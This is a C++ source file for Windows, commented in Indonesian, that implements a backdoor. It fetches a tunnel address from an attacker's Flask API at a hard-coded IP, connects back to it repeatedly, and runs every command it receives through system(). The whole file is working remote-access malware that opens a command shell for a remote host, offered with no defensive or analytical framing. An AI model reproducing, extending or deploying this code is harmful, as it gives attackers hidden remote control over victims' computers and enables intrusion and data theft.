#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define ATTACKER_API "http://192.168.1.3:5000"  // IP API Flask attacker

// Fungsi konversi `char*` ke `wchar_t*`
std::wstring convertToWideString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], size_needed);
    return wstr;
}

// Fungsi untuk mengambil alamat Ngrok dari API
std::string get_ngrok_address() {
    HINTERNET hInternet, hConnect;
    char buffer[1024];
    DWORD bytesRead;
    std::string result;

    hInternet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    std::wstring url = convertToWideString(ATTACKER_API);  // Konversi URL ke `LPCWSTR`
    hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead) {
        buffer[bytesRead] = 0;
        result += buffer;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return result;
}

// Fungsi untuk menjalankan backdoor
void run_backdoor() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (true) {
        std::string ngrok_addr = get_ngrok_address();
        if (ngrok_addr.empty()) {
            Sleep(5000);
            continue;
        }

        size_t colon_pos = ngrok_addr.find(":");
        if (colon_pos == std::string::npos) {
            Sleep(5000);
            continue;
        }

        std::string ip = ngrok_addr.substr(0, colon_pos);
        int port = std::stoi(ngrok_addr.substr(colon_pos + 1));

        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_addr.s_addr = inet_addr(ip.c_str());
        server.sin_family = AF_INET;
        server.sin_port = htons(port);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            char buffer[1024];
            while (true) {
                int recv_size = recv(sock, buffer, sizeof(buffer), 0);
                if (recv_size <= 0) break;
                buffer[recv_size] = '\0';
                system(buffer);
            }
        }

        closesocket(sock);
        WSACleanup();
        Sleep(10000);
    }
}

int main() {
    run_backdoor();
    return 0;
}
